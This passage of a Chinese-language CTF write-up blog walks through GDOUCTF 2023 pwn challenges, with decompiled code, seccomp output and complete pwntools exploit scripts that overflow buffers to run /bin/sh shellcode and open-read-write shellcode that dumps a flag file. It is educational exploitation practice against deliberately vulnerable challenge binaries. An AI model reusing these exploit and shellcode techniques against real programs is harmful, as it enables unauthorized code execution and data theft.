class="hljs-keyword">if</span> ( v5 )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Guess I couldn&#x27;t gaslight you!&quot;</span>);<br>    <span class="hljs-keyword">return</span> print_flag();<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>把v5覆盖成不为0的值即可<br><strong>[GDOUCTF 2023]Shellcode</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">10</span>]; <span class="hljs-comment">// [rsp+6h] [rbp-Ah] BYREF</span><br><br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  mprotect((<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> __int64)&amp;<span class="hljs-built_in">stdout</span> &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000</span>LL), <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please.&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;name, <span class="hljs-number">0x25</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Nice to meet you.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s start!&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x40</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>可以看到第一个read可以把输入的东西直接写入.bss段，第二个read存在明显的栈溢出，所以思路很明确，第一次输入将shellcode写在.bss段上，再用第二次输入溢出后跳到.bss段执行shellcode。<br>唯一坑：shellcode有长度限制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sgtlibc<br>elf=ELF(<span class="hljs-string">&#x27;./shellcode&#x27;</span>)<br>pop_rdi_addr = <span class="hljs-number">0x4007b3</span><br>ret_addr = <span class="hljs-number">0x4007AD</span><br>main_addr = <span class="hljs-number">0x400687</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>bss_addr = <span class="hljs-number">0x6010a0</span><br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = remote(<span class="hljs-string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28500</span>)<br><span class="hljs-comment">#wrongpayload1 = asm(shellcraft())</span><br>payload1=<span class="hljs-string">&quot;\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x54\x5F\x31\xF6\x31\xD2\x6A\x3B\x58\x0F\x05&quot;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Please.\n&quot;</span>,payload1)<br>payload2 =  <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xa</span>+<span class="hljs-number">8</span>)+p64(bss_addr) <br>p.sendlineafter(<span class="hljs-string">&#x27;start!\n&#x27;</span>,payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p>贴两个传送门：<a target="_blank" rel="noopener" href="https://www.roderickchan.cn/zh-cn/2023-02-20-the-art-of-shellcode">https://www.roderickchan.cn/zh-cn/2023-02-20-the-art-of-shellcode</a> &#x2F;&#x2F;art of the shellcode<br>            <a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm#disassembly">https://defuse.ca/online-x86-assembler.htm#disassembly</a>  &#x2F;&#x2F;编译shellcode的网站</p>
<p><strong>[GDOUCTF 2023]Random</strong><br>开了沙盒</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">str1k3@ubuntu:~/Desktop$ seccomp-tools dump <span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/QC26KN/RANDOM&#x27;</span> <br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="hljs-built_in">arch</span><br> 0001: 0x15 0x00 0x02 0xc000003e  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) goto 0004<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x15 0x00 0x01 0x0000003b  <span class="hljs-keyword">if</span> (A != execve) goto 0005<br> 0004: 0x06 0x00 0x00 0x00000000  <span class="hljs-built_in">return</span> KILL<br> 0005: 0x06 0x00 0x00 0x7fff0000  <span class="hljs-built_in">return</span> ALLOW<br></code></pre></td></tr></table></figure>
<p>0x60100到0x60200这段内存可读可写可执行，所以尝试把shellcode写入这段后将执行流劫持到该段<br>haha函数内存在jmp rsp指令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *  <br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 连接远程</span><br>p = remote(<span class="hljs-string">&quot;node6.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28969</span>)<br><span class="hljs-comment"># 加载rand函数的所在函数库</span><br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>libc.srand(libc.time(<span class="hljs-number">0</span>))<span class="hljs-comment">#设置srand函数</span><br><br>jmp_sp = <span class="hljs-number">0x40094E</span><br>data_addr = <span class="hljs-number">0x601000</span><br><br><span class="hljs-comment">#通过随机数验证  程序会跳转到vulnerable函数</span><br>p.sendlineafter(<span class="hljs-string">&quot;num:&quot;</span>,<span class="hljs-built_in">str</span>(libc.rand()%<span class="hljs-number">50</span>))<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">利用 jmp_sp + asm 的攻击方式  让sp指针跳回变量地址 执行shellcode: </span><br><span class="hljs-string">    在data_addr 0x601000 写入orw_shellcode后</span><br><span class="hljs-string">    并跳转执行data_addr 0x12300的orw_shellcode</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload=asm(shellcraft.read(<span class="hljs-number">0</span>,data_addr,<span class="hljs-number">0x100</span>))<span class="hljs-comment">#调用read函数 在data_addr 0x601000处写入 orw_shellcode内容</span><br>payload+=asm(<span class="hljs-string">&#x27;mov rax,0x601000;call rax&#x27;</span>)<span class="hljs-comment">#并且call ax寄存器 调用执行 data_addr 0x601000处的orw_shellcode</span><br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<span class="hljs-comment">#打满变量空间 和 rbp寄存器的字节</span><br>payload+=p64(jmp_sp)<span class="hljs-comment">#返回地址写成jmp_esp，继续运行当前sp后续指令 填写别的返回地址 就无法控制程序后面的执行流程了</span><br>payload+=asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<span class="hljs-comment">#此时sp已经离shellcode地址偏移0x30,这里把sp挪回到shellcode地址 并跳转到shellcode</span><br>p.sendlineafter(<span class="hljs-string">&quot;your door\n&quot;</span>,payload)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">orw_shellcode执行的内容:</span><br><span class="hljs-string">打开本地的flag文件 </span><br><span class="hljs-string">把flag文件内容写入到 data_addr+0x100</span><br><span class="hljs-string">把输出data_addr+0x100的flag文件内容</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>orw_shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>)<span class="hljs-comment">#打开本地的flag文件</span><br>orw_shellcode += shellcraft.read(<span class="hljs-number">3</span>, data_addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x50</span>)<span class="hljs-comment">#文件描述符3:其它打开的文件 flag内容写入到data_addr+0x100</span><br>orw_shellcode += shellcraft.write(<span class="hljs-number">1</span>, data_addr+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x50</span>)<span class="hljs-comment">#文件描述符1:输出  地址data_addr+0x100存储的flag内容</span><br>p.send(asm(orw_shellcode))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/25/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">← Next Linux保护机制</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/02/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/">pwn入门指北 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>